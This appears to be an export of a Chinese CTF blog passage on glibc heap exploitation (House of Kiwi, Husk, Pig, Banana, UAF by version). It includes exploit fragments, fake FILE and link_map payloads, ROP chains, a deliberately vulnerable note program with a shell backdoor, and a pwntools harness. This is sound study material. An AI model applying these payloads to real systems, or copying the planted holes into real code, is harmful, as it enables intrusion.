\t\t#190\nadd_malloc(0xe8,'\\x00') \t\t#191\n\nedit(191,0x10,\"/bin/sh\\x00\"+p64(libc_base+libc.sym['system'])) \t#191\nfree(191)\nit()\n#--------------------------------------------------------------\n```\n\n","tags":["off-by-null"],"categories":["PWN","pwn堆-off-by-null"]},{"title":"高版本各类堆技巧总结","url":"/2021/08/20/高版本堆各类技巧总结/","content":"\n# 一、House of KIWI\n\n[House OF Kiwi - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/235598)\n\n## 1.原理分析\n\n函数调用链：**assert->malloc_assert->fflush->_IO_file_jumps结构体中的__IO_file_sync**\n\n调用时的寄存器为：\n\n![图片2](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827170019.png)\n\n那么如果可以在不同版本下劫持对应setcontext中的赋值参数，即rdi或者rdx，就可以设置寄存器来调用我们想调用的函数。\n\n### (1)rdi和rdx互相转换\n\n①getkeyserv_handle+576：\n\n```\nplaintext\n\n#注释头\n\nmov rdx, [rdi+8]\nmov [rsp+0C8h+var_C8], rax\ncall qword ptr [rdx+20h]\n```\n\n通过rdi控制rdx，同样2.29以后不同版本都不太一样，需要再调试看看，比如2.31里就是：\n\n```\nplaintext\n\n#注释头\n\nmov rdx,QWORD PTR [rdi+0x8]\nmov QWORD PTR [rsp],rax\ncall QWORD PTR [rdx+0x20]\n```\n\n②svcudp_reply+26:\n\n```\nplaintext\n\n#注释头\n\nmov rbp, qword ptr [rdi + 0x48]; \nmov rax, qword ptr [rbp + 0x18]; \nlea r13, [rbp + 0x10]; \nmov dword ptr [rbp + 0x10], 0; \nmov rdi, r13; \ncall qword ptr [rax + 0x28];\n```\n\n通过rdi控制rbp实现栈迁移，然后即可任意gadget了。\n\n其中2.31版本下还是一样的，如下：\n\n```\nplaintext\n\n#注释头\n\nmov rbp,QWORD PTR [rdi+0x48]\nmov rax,QWORD PTR [rbp+0x18]\nlea r13,[rbp+0x10]\nmov DWORD PTR [rbp+0x10],0x0\nmov rdi,r13\ncall QWORD PTR [rax+0x28]\n```\n\n### (2)不同劫持\n\n这里观察寄存器就可以知道，不同版本的setcontext对应的rdi和rdx，这里就劫持哪一个。另外这里的rdi为_IO_2_1_stderr结构体，是从stderr@@GLIBC_2.2.5取值过来的，也就是data段上的数据，如果可以取得ELF基地址，直接劫持该指针为chunk地址也是可以的，这样就能劫持RDI寄存器了。\n\n![图片1](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827165944.png)\n\n这样如果劫持__IO_file_sync函数指针为setcontext，配合劫持的rdi和rdx就可以来调用我们想调用函数从而直接getshell或者绕过orw。\n\n## 2.触发条件\n\n只要assert判断出错都可以，常用以下几个\n\n(1)top_chunk改小，并置pre_inuse为0，当top_chunk不足分配时会触发一个assert。(该assert函数在sysmalloc函数中被调用)\n\n![Snipaste_2021-08-28_11-56-34](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828115642.png)\n\n**(2)largebin chunk的size中的flag位，这个不太清楚....**\n\n(3)如果是2.29及以下，因为在tcache_put和tcache_get中还存在assert的关系，所以如果可以修改掉mp_.tcache_bins，将之改大，(利用largebin attack)就会触发assert\n\n```c\n//2.29\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n  assert (tc_idx < TCACHE_MAX_BINS);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\n//2.29\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  assert (tc_idx < TCACHE_MAX_BINS);\n  assert (tcache->entries[tc_idx] > 0);\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\n  return (void *) e;\n}\n```\n\n![Snipaste_2021-08-28_11-46-59](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828114858.png)\n\n\n\n## 3.适用条件\n\n如果将`exit`函数替换成`_exit`函数,最终结束的时候,则是进行了syscall来结束,并没有机会调用`_IO_cleanup`,若再将`__malloc_hook`和`__free_hook`给ban了,且在输入和输出都用read和write的情况下,无法hook且无法通过IO刷新缓冲区的情况下。这时候可以借用malloc出错调用**malloc_assert->fflush->_IO_file_sync**函数指针。且进入的时候rdx为`_IO_helper_jumps_addr`，rdi为`_IO_2_1_stderr_addr`。\n\n\n\n# 二、House of Husk\n\n[house-of-husk学习笔记 (juejin.cn)](https://juejin.cn/post/6844904117119385614)\n\n## **1**.原理分析\n\n函数调用链:\n\n```c\nprintf->vfprintf->printf_positional->__parse_one_specmb->__printf_arginfo_table(spec)\n\t\t\t\t\t\t\t\t\t\t\t\t|\n    \t\t\t\t\t\t\t\t\t\t\t ->__printf_function_table(spec)\n```\n\n**__parse_one_specmb** 函数 会调用 **__printf_arginfo_table**和**__printf_function_table**两个函数指针中对应spec索引的函数指针**printf_arginfo_size_function**\n\n▲这个spec索引指针就是格式化字符的ascii码值，比如printf(\"%S\")，那么就是S的ascii码值。当然，这个方法的前提是得有printf系列函数，并且有格式化字符。\n\n即调用**(*__printf_arginfo_table+'spec'8) 和  (*printf_function_table+'spec'8)**这两个函数指针。\n\n而实际情况会先调用**__printf_arginfo_table**中对应的spec索引的函数指针，然后调用**__printf_function_table**对应spec索引函数指针。\n\n所以如果修改了**__printf_arginfo_table**和**__printf_function_table**，则需要确保对应的spec索引对应的函数指针，要么为0，要么有效。\n\n同时如果选择这个方法，就得需要**__printf_arginfo_table**和**__printf_function_table**均不为0才行。\n\n```c\n//2.31 vfprintf-internal.c(stdio-common)\n\n/* Use the slow path in case any printf handler is registered.  */\nif (__glibc_unlikely (__printf_function_table != NULL\n                      || __printf_modifier_table != NULL\n                      || __printf_va_arg_table != NULL))\n    goto do_positional;\n\n\ndo_positional:\nif (__glibc_unlikely (workstart != NULL))\n{\n    free (workstart);\n    workstart = NULL;\n}\ndone = printf_positional (s, format, readonly_format, ap, &ap_save,\n                          done, nspecs_done, lead_str_end, work_buffer,\n                          save_errno, grouping, thousands_sep, mode_flags);\n```\n\n```c\n//2.31 vfprintf-internal.c(stdio-common)\n\n(void) (*__printf_arginfo_table[specs[cnt].info.spec])\n(&specs[cnt].info,\n specs[cnt].ndata_args, &args_type[specs[cnt].data_arg],\n &args_size[specs[cnt].data_arg]);\n\n\n/* Call the function.  */\nfunction_done = __printf_function_table[(size_t) spec]\n    (s, &specs[nspecs_done].info, ptr);\n```\n\n即如果table不为空，则调用`printf_positional`函数，然后如果spec不为空，则调用对应spec索引函数。但是有时候不知道printf最终会调用哪个spec，可能隐藏在哪，所以直接把干脆`_printf_arginfo_table`和`__printf_function_table`中的值全给改成one_gadget算了。\n\n▲综上，得出以下条件：\n\n```C\nA.\t__printf_function_table = heap_addr \n\t__printf_arginfo_table != 0\n//其中__printf_arginfo_table和__printf_function_table可以对调\nB. heap_addr+'spec'*8 = one_gadget\n```\n\n![图片1](https://i.loli.net/2021/08/20/23CGNn46r5xEgJy.png)\n\n在2.29下可以直接用largebin attack爆破修改两个地方，当然还是需要先泄露地址的。\n\n## 2.触发条件\n\n即需要printf家族函数被调用，且其中需带上格式化字符，比如%s，%x等，用来计算spec，这个和libc版本无关，相当于只针对printf家族函数进行攻击的。\n\n## 3.适用条件\n\n具有printf家族函数，并且存在spec，合适地方会调用。\n\n\n\n# 三、House of Pig\n\n[house of pig一个新的堆利用详解 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/242640)\n\n## 1.原理分析\n\n### (1)劫持原理\n\n**_IO_str_overflow**函数中会连续调用**malloc memcpy free**三个函数。并且**__IO_str_overflow**函数传入的参数rdi为从**_IO_list_all**中获取的**_IO_2_1_stderr**结构体的地址。所以如果我们能改掉**_IO_list_all**中的值就能劫持进入该函数的参数`rdi`。\n\n![Snipaste_2021-08-28_17-15-06](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828171517.png)\n\n所以如上所示，即劫持成功。\n\n### (2)Getshell原理\n\n#### ①函数流程\n\nA.在`_IO_str_overflow`函数中会先申请chunk为`new_buf`，然后会依据`rdi`的值，将`rdi`当作`_IO_FILE`结构体，从该结构体中获取`_IO_buf_base`当作`old_buf`。\n\nB.依据`old_blen` 和`_IO_buf_base`来拷贝数据到`new_buf`中，然后释放掉`old_buf`。其中`old_blen` 是通过`_IO_buf_end`减去`_IO_buf_base`得到的。\n\n```c\n//2.31 strops.c中的_IO_str_overflow\nif (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */\n    return EOF;\nelse\n{\n    char *new_buf;\n    char *old_buf = fp->_IO_buf_base;\n    size_t old_blen = _IO_blen (fp);\n    size_t new_size = 2 * old_blen + 100;\n    if (new_size < old_blen)\n        return EOF;\n    new_buf = malloc (new_size);//-------house of pig:get chunk from tcache\n    if (new_buf == NULL)\n    {\n        /*\t  __ferror(fp) = 1; */\n        return EOF;\n    }\n    if (old_buf)\n    {\n        memcpy (new_buf, old_buf, old_blen);\n        //-------house of pig:copy /bin/sh and system to _free_hook\n        free (old_buf);\t\t//-------house of pig:getshell\n        /* Make sure _IO_setb won't try to delete _IO_buf_base. */\n        fp->_IO_buf_base = NULL;\n    }\n```\n\n\n\n![Snipaste_2021-08-28_17-30-42](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828173049.png)\n\n#### ②劫持所需数据\n\n所以如果在申请的`new_buf`包含为`_free_hook`，然后我们在`_IO_buf_base`和`_IO_buf_end`这里一段数据块中将`system_addr`放入，那么就可以将`system_addr`拷贝到`_free_hook`中。之后释放掉`old_buf`，如果`old_buf`中的头部数据为`/bin/sh\\x00`，那么就能直接**getshell**了。得到以下劫持所需数据：\n\n```c\n*(_IO_list_all) = chunk_addr;\n(struct _IO_FILE*)chunk_addr->_IO_buf_base = chunk_sh_sys_addr;\n(struct _IO_FILE*)chunk_addr->_IO_buf_end = chunk_sh_sys_addr+old_blen;\n//2 * old_blen + 100 通常我们选取old_blen为0x18，那么计算得到的tc_idx为8\ntcachebin[tc_idx] = _free_hook_addr-old_blen;\n```\n\n但是如何使得tcachebin[tc_idx]中的Chunk为`_free_hook_addr-old_blen`呢，这个就用到技术\n\n`Largebin attack + Tcache Stashing Unlink Attack`，这个技术原理比较复杂，自己看吧。\n\n**通常是只能使用callo的情况下来用的，因为如果能malloc那直接从tcache中malloc出来不就完了。**\n\n然后由于`_IO_str_overflow`函数中的一些检查，所以有的地方还是需要修改的：\n\n```python\nfake_IO_FILE = p64(0)*2\nfake_IO_FILE += p64(1)                     #change _IO_write_base = 1\nfake_IO_FILE += p64(0xffffffffffff)        #change _IO_write_ptr = 0xffffffffffff\nfake_IO_FILE += p64(0)\n#need copy '/bin/sh' and system from a old_buf to new_buf\nfake_IO_FILE += p64(heap_base+0x003900+0x10)       #set _IO_buf_base (old_buf(start))\nfake_IO_FILE += p64(heap_base+0x003900+0x10+0x18)  #set _IO_buf_end  (old_buf(end))   \n#old_blen=old_buf(start)-old_buf(end)\nfake_IO_FILE = fake_IO_FILE.ljust(0xb0, '\\x00')\nfake_IO_FILE += p64(0)                    #change _mode = 0\nfake_IO_FILE = fake_IO_FILE.ljust(0xc8, '\\x00')\nfake_IO_FILE += p64(IO_str_vtable)        #change vtable to _IO_str_jumps\n```\n\n## 2.触发条件\n\n(1)Libc结构被破坏的abort函数中会调用刷新\n(2)调用exit()\n(3)能够从main函数返回\n\n## 3.适用条件\n\n程序只能通过calloc来获取chunk时\n\n\n\n# 四、House of banana\n\n[house of banana - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/222948)\n\n[main_arena劫持及link_map劫持 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/211331)\n\n## 1.原理分析\n\n函数调用链：**exit()->_dl_fini->(fini_t)array[i]**\n\n```c\n//2.31 glibc/elf/dl_fini.c\n\n/* First see whether an array is given.  */\nif (l->l_info[DT_FINI_ARRAY] != NULL)\n{\n    ElfW(Addr) *array =\n        (ElfW(Addr) *) (l->l_addr\n                        + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);\n    unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val\n                      / sizeof (ElfW(Addr)));\n    while (i-- > 0)\n        ((fini_t) array[i]) ();\n}\n```\n\n所以如果可以使得*array[i] = one_gadget，那么就可以一键getshell。而array[i]调用时这里就有两种套路：\n\n### (1)伪造link_map结构体\n\n直接伪造`link_map`结构体，将原本指向`link_map`的指针指向我们伪造的`link_map`，然后伪造其中数据，绕过检查，最后调用array[i]。这里通常利用largebin attack来将堆地址写到`_rtld_global`这个结构体指针中。\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830185253.png)\n\n`link_map`的布局通常如下：\n\n```python\n#largebin attack's chunk\n#*_rtld_local=fake_link_map_chunk_addr\nfake_link_map_chunk_addr = heap_base+0x001000\nedit(1,0x448,'\\x00'*0x448)  #empty the fake_link_map_chunk\nfake_link_map_data = \"\"\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr + 0x20)\t\t#0 1\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr)\t\t\t#2 3\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr + 0x28)\t\t#4 5\nfake_link_map_data += p64(fake_link_map_chunk_addr + 0x50) + p64(fake_link_map_chunk_addr + 0x20)\t\t\t\t\t\t\t\t\t \n#6 7\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x28) + p64(0x0)\t\t#8 9\nfake_link_map_data += p64(0) + p64(0x0)\t\t\t\t\t\t\t\t\t#10 11\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr + 0x50)\t\t#12 13\nfake_link_map_data =  fake_link_map_data.ljust(0x100,'\\x00')\n\nfake_link_map_data += p64(fake_link_map_chunk_addr + 0x190) + p64(0)\t\t\t\n#0x20 0x21\nfake_link_map_data += p64(fake_link_map_chunk_addr + 0x128) + p64(0)\t\t\n#0x22 0x23\nfake_link_map_data += p64(0x8) + p64(0)\t\t\t\t\t\t\t\t\t#0x24 0x25\nfake_link_map_data =  fake_link_map_data.ljust(0x180,'\\x00')\n\nfake_link_map_data += p64(0x1A) + p64(0x0)\t\t\t\t\t\t\t\t#0x30 0x31\nfake_link_map_data += p64(elf_base + elf.sym['backdoor']) + p64(0)\t\t#0x32 0x33\n\n#set fake_chunk->pre_size\nedit(0,0xd68,'\\x00'*0xd60+p64(fake_link_map_chunk_addr + 0x1a0))\nfake_link_map_data = fake_link_map_data.ljust(0x308,'\\x00')\nfake_link_map_data += p64(0x800000000)\n```\n\n![Snipaste_2021-08-29_09-49-17](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830212809.png)\n\n### (2)修改link_map结构体数据\n\n修改对应link_map结构体中的数据，绕过检查，最终调用array[i]。这里就通常需要利用任意申请来申请到该结构体，然后修改其中的值，因为当调用array[i]时，传入的实际上是link_map中的某个地址，即rdx为link_map+0x30，这个不同版本好像不太一样，2.31及以上为link_map+0x38。\n\n主要伪造以下数据：\n\n![Snipaste_2021-08-30_18-56-38](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830191318.png)\n\n这个方法常用来打ORW，因为可以我们可以直接将ROP链布置在link_map中。然而因为版本间的关系，所以数据也有点不同，实际布局：\n\n#### 2.31\n\n![Snipaste_2021-08-30_18-49-43](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830184953.png)\n\n```python\n//docker 2.31 gadget\npop_rdi_ret = libc_base + 0x0000000000026b72;\npop_rsi_ret = libc_base + 0x0000000000027529;\npop_rax_ret = libc_base + 0x000000000004a550;\nsyscall_ret = libc_base + 0x0000000000066229;\npop_rdx_r10_ret = libc_base + 0x000000000011c371\nsetcontext_addr = libc_base + libc.sym['setcontext']\nlg(\"setcontext_addr\",setcontext_addr)\nret = pop_rdi_ret+1;\n\nfake_link_map_chunk_addr = top_chunk_hijack+0x4+0x10\nfake_rsp = fake_link_map_chunk_addr + 8*8\nflag = fake_link_map_chunk_addr + 30*8\n\norw = \"\"\n#fake_rsp_addr =  fake_link_map_chunk_addr + 8*8\norw += p64(pop_rdi_ret) + p64(flag)\t\t\t\t\t\t\t\t\t\t#8\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_r10_ret) + p64(0x30) + p64(0x0)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n\nfake_link_map_data = \"\"\n#set l_addr(0) point to fini_array\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x20) + p64(0x0)   \t#0 \t1\n#set l_next(3) and *(l_next)=vdso_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr+0x5b0)  \t#2 \t3\n#set l_real(5) point to fake_link_map_chunk_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr)\t\t\t#4 \t5\nfake_link_map_data += p64(setcontext_addr+61) + p64(ret)\t\t\t\t#6 \t7\nfake_link_map_data += orw\t\t\t\t\t\t\t\t\t\t\t\t#8~25\nfake_link_map_data = fake_link_map_data.ljust(26*8,'\\x00')\n\n#for rcx  push rcx\nfake_link_map_data += p64(0x0) + p64(fake_rsp)\t\t\t\t\t\t\t#26 27\nfake_link_map_data += p64(ret) + p64(0x0)\t\t\t\t\t\t\t\t#28 29\n#flag_addr = fake_link_map_chunk_addr + 30*8\nfake_link_map_data += './flag\\x00\\x00'\t\t\t\t\t\t\t\t\t#30\nfake_link_map_data = fake_link_map_data.ljust(34*8,'\\x00')\t\t\t\t#30~33\n\n#fake circle link_list\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x110) + p64(0x0)\t#34 35\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x120) + p64(0x20)\t#36 37\n```\n\n\n\n#### 2.29\n\n![Snipaste_2021-08-30_16-16-41](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830161702.png)\n\n```python\n//docker 2.29 gadget\npop_rdi_ret = libc_base + 0x0000000000026542;\npop_rsi_ret = libc_base + 0x0000000000026f9e;\npop_rax_ret = libc_base + 0x0000000000047cf8;\nsyscall_ret = libc_base + 0x00000000000cf6c5;\npop_rdx_r10_ret = libc_base + 0x000000000012bda4\nsetcontext_addr = libc_base + libc.sym['setcontext']\nlg(\"setcontext_addr\",setcontext_addr)\nret = pop_rdi_ret+1;\n\n\nfake_link_map_chunk_addr = top_chunk_hijack+0x4+0x10\nfake_rsp = fake_link_map_chunk_addr + 8*8\nflag = fake_link_map_chunk_addr + 30*8\n\norw = \"\"\n#fake_rsp_addr =  fake_link_map_chunk_addr + 8*8\norw += p64(pop_rdi_ret) + p64(flag)\t\t\t\t\t\t\t\t\t\t#8\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_r10_ret) + p64(0x30) + p64(0x0)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n\nfake_link_map_data = \"\"\n#set l_addr(0) point to fini_array\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x20) + p64(0x0)   \t#0 \t1\n#set l_next(3) and *(l_next)=vdso_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr+0x5a0)  \t#2 \t3\n#set l_real(5) point to fake_link_map_chunk_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr)\t\t\t#4 \t5\nfake_link_map_data += p64(setcontext_addr+53) + p64(ret)\t\t\t\t#6 \t7\nfake_link_map_data += orw\t\t\t\t\t\t\t\t\t\t\t\t#8~25\nfake_link_map_data = fake_link_map_data.ljust(26*8,'\\x00')\n\n#for rcx  push rcx\nfake_link_map_data += p64(fake_rsp) + p64(ret)\t\t\t\t\t\t\t#26 27\nfake_link_map_data += p64(0x0) + p64(0x0)\t\t\t\t\t\t\t\t#28 29\n#flag_addr = fake_link_map_chunk_addr + 30*8\nfake_link_map_data += './flag\\x00\\x00'\t\t\t\t\t\t\t\t\t#30\nfake_link_map_data = fake_link_map_data.ljust(34*8,'\\x00')\t\t\t\t#30~33\n\n#fake circle link_list\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x110) + p64(0x0)\t#34 35\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x120) + p64(0x20)\t#36 37\n```\n\n▲这里需要注意的是由于ld动态连接加载的事情，所以就算是同一个版本中的link_map相对于libc基地址在不同机器中也有可能是不同的，需要爆破第4，5两位，一个字节。\n\n▲题外话：适用到ld动态链接库的话，如果直接patchelf的话，很可能出错的，原因未知。推荐还是用docker:\n\n[PIG-007/pwnDockerAll (github.com)](https://github.com/PIG-007/pwnDockerAll)\n\n## 2.触发条件\n\n(1)调用exit()\n(2)能够从main函数返回\n\n## 3.适用条件\n\nban掉了很多东西的时候。但是这个需要泄露地址才行的，另外由于可能需要爆破一个字节，所以如果还涉及其他的爆破就得慎重考虑一下了，别到时候爆得黄花菜都凉了。\n","tags":["Heap"],"categories":["PWN","pwn堆-Skill"]},{"title":"各版本UAF专场","url":"/2021/08/19/各版本UAF专场/","content":"\n# 前言\n\n一般来说UAF都是比较好利用的，尤其是在有tcache的版本下，2.32之前，没有对fd做任何检查，也没有对size做任何检查，那么直接改fd就能想申请哪儿就申请哪儿。但是这里就面临地址的问题，所以高版本下的UAF常常不会给你Show函数，通常结合FSOP来爆破泄露地址。而低版本的，没有tcache的时候，不给show函数会更加困难，因为fastbin attack会检查size位，通常还需要伪造。\n\n这里就2.23~2.32版本的UAF做个总结利用，各个条件的缩减。\n\n# 一、题目及调试脚本\n\n▲首先给出自己为了方便调试写的题和对应的exp，存在UAF，堆溢出，后门，malloc和calloc切换等多个漏洞，但是去除了Double free参考note题目：\n\n```c\n//gcc -ggdb note.c -o note\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nchar* notelist[1000];\nint* freelist[1000];\n\nint count = 0;\n\n\nvoid backdoor() {\n   puts(\"You hacked me!!\");\n   system(\"/bin/sh\");\n}\n\nvoid malloc_add_note(){\n    int i = count;\n    char buf[8];\n    int size;\n    char* chunk;\n    printf(\"Note size :\");\n    read(0, buf, 8);\n    size = atoi(buf);\n    chunk = (char *)malloc(size);\n    if (!chunk)\n    {\n        puts(\"Alloca Error\");\n        exit(-1);\n    }\n    printf(\"Content :\");\n    read(0, chunk, size);\n    puts(\"Success!\");\n    notelist[i] = chunk;\n    count++;\n}\n\nvoid calloc_add_note(){\n    int i = count;\n    char buf[8];\n    int size;\n    char* chunk;\n    printf(\"Note size :\");\n    read(0, buf, 8);\n    size = atoi(buf);\n    chunk = (char *)calloc(0x1,size);\n    if (!chunk)\n    {\n        puts(\"Alloca Error\");\n        exit(-1);\n    }\n    printf(\"Content :\");\n    read(0, chunk, size);\n    puts(\"Success!\");\n    notelist[i] = chunk;\n    count++;\n}\n\nvoid del_note()\n{\n    char buf[4];\n    int idx;\n    printf(\"Index :\");\n    read(0, buf, 4);\n    idx = atoi(buf);\n    if (idx < 0 || idx >= count)\n    {\n        puts(\"Out of bound!\");\n        return;\n    }\n    if (notelist[idx] && (freelist[idx] != idx))\n    {\n        free(notelist[idx]);\n        freelist[idx] = idx;\n        puts(\"Success!\");\n        return;\n    }\n    else\n    {\n        puts(\"Can not double free!\");\n        return;\n        \n\n    }\n\n}\n\nvoid print_note()\n{\n    char buf[4];\n    int idx;\n    printf(\"Index :\");\n    read(0, buf, 4);\n    idx = atoi(buf);\n    if (idx < 0 || idx >= count)\n    {\n        puts(\"Out of bound!\");\n        return;\n    }\n    if (notelist[idx])\n    {\n        puts(notelist[idx]);\n        return;\n    }\n}\n\nvoid edit_note()\n{\n    char buf[8];\n    int idx;\n    int size;\n    printf(\"Index :\");\n    read(0, buf, 4);\n    idx = atoi(buf);\n    if (idx < 0 || idx >= count)\n    {\n        puts(\"Out of bound!\");\n        return;\n    }\n    printf(\"Size :\");\n    read(0, buf, 8);\n    size = atoi(buf);\n    if (notelist[idx])\n    {\n        printf(\"Content :\");\n        read(0, notelist[idx], size);\n        puts(\"Success!\");\n        return;\n    }\n}\n\n\nvoid menu() {\n    puts(\"----------------------\");\n    puts(\"       MY  NOTE       \");\n    puts(\"----------------------\");\n    puts(\" 1. Malloc Add note   \");\n    puts(\" 2. Delete note       \");\n    puts(\" 3. Print note        \");\n    puts(\" 4. Edit note         \");\n    puts(\" 5. Calloc Add note   \");\n    puts(\" 6. Exit              \");\n    puts(\"--------Author:PIG-007\");\n    printf(\"Your choice :\");\n};\n\nint main() {\n    setvbuf(stdout, 0, 2, 0);\n    setvbuf(stdin, 0, 2, 0);\n    freelist[0] = 1001;\n    char* heap_leak = (char*)(malloc(0x438));\n    printf(\"Gift_Heap:%p\\n\",heap_leak);\n\n    char* libc_leak = (char*)&printf;\n    printf(\"Gift_Libc:%p\\n\",libc_leak);\n    \n    char* elf_leak = (char*)&main;\n    printf(\"Gift_elf:%p\\n\",elf_leak);\n    \n    free(heap_leak);\n    heap_leak = NULL;\n    libc_leak = NULL;\n    elf_leak = NULL;\n    char buf[4];\n    while (1) {\n        menu();\n        read(0, buf, 4);\n        switch(atoi(buf))\n        {\n            case 1:\n                malloc_add_note();\n                break;\n            case 2:\n                del_note();\n                break;\n            case 3:\n                print_note();\n                break;\n            case 4:\n                edit_note();\n                break;\n            case 5:\n                calloc_add_note();\n                break;\n            case 6:\n                exit(0);\n                break;\n            default:\n                puts(\"Invalid choice!\");\n                break;\n        }\n    }\n    return 0;\n\n}\n```\n\n 对应exp设置：\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\n#from LibcSearcher import *\nimport commands\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\ncontext.timeout = 0.5\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./note\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\nelf = ELF(binary)\nlargeBinIdx = 1096\nunsortedBinIdx = 88\n\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n\tmyGdb.close()\n\tpause()\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef add_malloc(size,content):\n\tp.sendlineafter(\"Your choice :\",'1')\n\tp.sendlineafter('Note size :',str(size))\n\tp.sendafter('Content :',content)\n\ndef free(idx):\n\tp.sendlineafter(\"Your choice :\",'2')\n\tp.sendlineafter('Index :',str(idx))\n\ndef show(idx):\n\tp.sendlineafter(\"Your choice :\",'3')\n\tp.sendlineafter('Index :',str(idx))\n    \ndef edit(idx,size,content):\n\tp.sendlineafter(\"Your choice :\",'4')\n\tp.sendlineafter('Index :',str(idx))\n\tp.sendlineafter('Size :',str(size))\n\tp.sendafter('Content :',content)    \n    \ndef add_calloc(size,content):\n\tp.sendlineafter(\"Your choice :\",'5')\n\tp.sendlineafter('Note size :',str(size))\n\tp.sendafter('Content :',content)\n\ndef exit():\n\tp.sendlineafter(\"Your choice :\",'6')\n\ndef edit_m(idx,size,content):\n\tsleep(0.01)\n\tp.sendline('4')\n\tsleep(0.01)\n\tp.sendline(str(idx))\n\tsleep(0.01)\n\tp.sendline(str(size))\n\tsleep(0.01)\n\tp.send(content)\n\tsleep(0.01)\n\ndef free_m(idx):\n\tsleep(0.01)\n\tp.sendline('2')\n\tsleep(0.01)\n\tp.sendline(str(idx))\n\tsleep(0.01)\n\ndef add_malloc_m(size,content):\n\tsleep(0.01)\n\tp.sendline('1')\n\tsleep(0.01)\n\tp.sendline(str(size))\n\tsleep(0.01)\n\tp.send(content)\n\tsleep(0.01)\n\ndef tcacheDelete(idx):\n\tfor i in range(7):\n\t\tfree(i+idx)\n        \ndef tcacheMalloc(size):\n\tfor i in range(7):\n\t\tadd_malloc(size,'\\x00')\n\ndef leak_heap():\n\tglobal largeBinIdx\n\tglobal unsortedBinIdx\n\tru(\"Gift_Heap:0x\")\n\tLeakHeap = int(rc(12),16)\n\tlog.info(\"LeakHeap:0x%x\"%LeakHeap)\n\tpath = libc.path\n\t#version = [\"2.23\",\"2.27\",\"2.29\",\"2.31\",\"2.32\",\"2.33\"]\n\tif(\"2.23\" in path):\n\t\theap_base = LeakHeap - 0x10\n\telif(\"2.24\" in 